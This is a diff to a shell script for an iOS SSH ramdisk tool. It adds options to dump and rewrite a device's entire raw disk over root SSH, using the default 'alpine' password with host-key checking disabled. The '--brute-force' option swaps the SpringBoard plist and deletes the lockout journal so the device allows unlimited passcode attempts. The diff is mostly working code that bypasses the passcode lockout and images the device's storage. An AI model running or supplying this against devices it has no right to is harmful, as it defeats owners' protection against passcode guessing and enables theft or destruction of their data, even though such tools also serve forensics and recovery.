@@ -160,6 +160,65 @@ elif [ "$1" = '--restore-activation' ]; then
     killall iproxy 2>/dev/null | true
     sudo killall usbmuxd 2>/dev/null | true
     exit
+elif [ "$1" = '--dump-nand' ]; then
+    ./sshrd.sh 12.0
+    ./sshrd.sh boot
+    sleep 10
+    if [ "$oscheck" = 'Linux' ]; then
+        sudo systemctl stop usbmuxd 2>/dev/null | true
+        sudo killall usbmuxd 2>/dev/null | true
+        sleep .1
+        sudo usbmuxd -pf 2>/dev/null &
+        sleep .1
+    fi
+    echo "[*] Dumping /dev/disk0, this will take a long time"
+    "$oscheck"/iproxy 2222 22 &>/dev/null &
+    "$oscheck"/sshpass -p alpine ssh root@127.0.0.1 -p2222 -o StrictHostKeyChecking=no "dd if=/dev/disk0 bs=64k | gzip -1 -" | dd of=disk0.gz bs=64k
+    echo "[*] Done!"
+    killall iproxy 2>/dev/null | true
+    sudo killall usbmuxd 2>/dev/null | true
+    exit
+elif [ "$1" = '--restore-nand' ]; then
+    ./sshrd.sh 12.0
+    ./sshrd.sh boot
+    sleep 10
+    if [ "$oscheck" = 'Linux' ]; then
+        sudo systemctl stop usbmuxd 2>/dev/null | true
+        sudo killall usbmuxd 2>/dev/null | true
+        sleep .1
+        sudo usbmuxd -pf 2>/dev/null &
+        sleep .1
+    fi
+    echo "[*] Restoring /dev/disk0, this will take a long time"
+    "$oscheck"/iproxy 2222 22 &>/dev/null &
+    dd if=disk0.gz bs=64k | "$oscheck"/sshpass -p alpine ssh root@127.0.0.1 -p2222 -o StrictHostKeyChecking=no "gzip -d | dd of=/dev/disk0 bs=64k"
+    echo "[*] Done!"
+    killall iproxy 2>/dev/null | true
+    sudo killall usbmuxd 2>/dev/null | true
+    exit
+elif [ "$1" = '--brute-force' ]; then
+    ./sshrd.sh 12.0
+    ./sshrd.sh boot
+    sleep 10
+    if [ "$oscheck" = 'Linux' ]; then
+        sudo systemctl stop usbmuxd 2>/dev/null | true
+        sudo killall usbmuxd 2>/dev/null | true
+        sleep .1
+        sudo usbmuxd -pf 2>/dev/null &
+        sleep .1
+    fi
+    "$oscheck"/iproxy 2222 22 &>/dev/null &
+    "$oscheck"/sshpass -p alpine ssh root@127.0.0.1 -p2222 -o StrictHostKeyChecking=no "/sbin/mount_hfs /dev/disk0s1s1 /mnt1"
+    "$oscheck"/sshpass -p alpine ssh root@127.0.0.1 -p2222 -o StrictHostKeyChecking=no "/sbin/mount_hfs /dev/disk0s1s2 /mnt2"
+    "$oscheck"/sshpass -p alpine ssh root@127.0.0.1 -p2222 -o StrictHostKeyChecking=no "cp /com.apple.springboard.plist /mnt1"
+    "$oscheck"/sshpass -p alpine ssh root@127.0.0.1 -p2222 -o StrictHostKeyChecking=no "mv /mnt2/mobile/Library/Preferences/com.apple.springboard.plist /mnt2/mobile/Library/Preferences/com.apple.springboard.plist.bak"
+    "$oscheck"/sshpass -p alpine ssh root@127.0.0.1 -p2222 -o StrictHostKeyChecking=no "ln -s /com.apple.springboard.plist /mnt2/mobile/Library/Preferences/com.apple.springboard.plist"
+    "$oscheck"/sshpass -p alpine ssh root@127.0.0.1 -p2222 -o StrictHostKeyChecking=no "rm /mnt2/mobile/Library/SpringBoard/LockoutStateJournal.plist || :"
+    "$oscheck"/sshpass -p alpine ssh root@127.0.0.1 -p2222 -o StrictHostKeyChecking=no "/sbin/reboot"
+    echo "[*] Now the device should get unlimited passcode attempts"
+    killall iproxy 2>/dev/null | true
+    sudo killall usbmuxd 2>/dev/null | true
+    exit
 elif [ "$oscheck" = 'Darwin' ]; then
     if ! (system_profiler SPUSBDataType 2> /dev/null | grep ' Apple Mobile Device (DFU Mode)' >> /dev/null); then
         echo "[*] Waiting for device in DFU mode"
@@ -435,6 +494,7 @@ else
     :
         fi
         "$oscheck"/hfsplus work/ramdisk.dmg untar sshtars/ssh.tar > /dev/null
+        "$oscheck"/hfsplus work/ramdisk.dmg untar other/sbplist.tar > /dev/null
     fi
 fi
 if [ "$oscheck" = 'Darwin' ]; then
